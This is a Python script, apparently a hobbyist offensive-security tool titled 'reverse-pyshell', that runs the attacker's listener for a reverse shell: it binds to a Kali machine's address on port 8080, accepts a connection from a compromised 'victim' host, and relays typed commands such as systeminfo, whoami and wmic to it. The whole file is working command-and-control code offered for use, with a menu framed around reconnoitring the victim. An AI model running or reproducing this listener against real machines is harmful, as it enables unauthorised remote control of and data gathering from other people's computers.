#!usr/bin/env python3

import socket
import os


def clear():
     
     os_name = os.name

     if os_name == "nt":
          os.system("cls")
     else:
          os.system("clear")
clear()

#   Color pattern Ansi code
RED = '\033[31m'        # RED coloR
GREEN = '\033[32m'      # GREEN color
BOLD = '\033[1m'        # Bold font
RESET = '\033[0m'       # Reset all


banner = f"""{RED}{BOLD}

                                              (       )     (    (     
                                              )\ ) ( /(     )\ ) )\ )  
 (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
 )(   ))\ /((   ))\ )(  (   ))\ ___`  )  )\ ) /(_)((_)\ )\  /(_))/(_)) 
(()\ /((_(_))\ /((_(()\ )\ /((_|___/(/( (()/((_))  _((_((_)(_)) (_))   
 ((_(_)) _)((_(_))  ((_((_(_))    ((_)_\ )(_)/ __|| || | __| |  | |    
| '_/ -_)\ V // -_)| '_(_-/ -_)   | '_ \| || \__ \| __ | _|| |__| |__  
|_| \___| \_/ \___||_| /__\___|   | .__/ \_, |___/|_||_|___|____|____| 
                                  |_|    |__/                           

                                  Author  : Naresh
                                  Github  : https://github.com/theNareshofficial
                                  Youtube : https://www.youtube.com/@nareshtechweb930


{RESET}
"""

print(f"{banner}")

# Showing what commands are all you use in shell
info = """  

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
                        SHELL COMMANDS
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-

pwd                                 print working directory
terminate                           Exit from shell
systeminfo                          Victim system information
ls, dir                             list Directory
hostname                            Domain name
whoami                              User name
ipconfig                            Show IP address
ping <ip>                           Ping iP address
wmic bios get serial number         System serialnumber
tasklist                            Taskmanger
netstat                             Port IP connection


"""

ip_addr = "Your Kali IP"         # use your kali IP address
port = 8080                      # use any port


def connect():      # Create and connect with target machine
            
            try:
                 
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((ip_addr, port))
                s.listen(1)

                print(f"{RED}[!] Listening TCP connection from PORT 8080")

                conn, addr = s.accept()

                print(f"{GREEN}[+] We got a connection from : ", addr)
            
                while True:

                    command = input("SHELL>>>").encode()

                    if b"terminate" in command:
                        conn.send(b"terminate")
                        conn.close()
                        break
                    if b"INFO" in command.upper():
                        conn.send(b"info")
                        print(info)
                    else:
                        conn.send(command)
                        response = conn.recv(1024)
                        print(response.decode())

            except Exception as e:
                 print(f"{RED}COnnection Error : ",e)
            except KeyboardInterrupt:
                 pass

def main():
    connect()

if __name__ == "__main__":
    main()
    


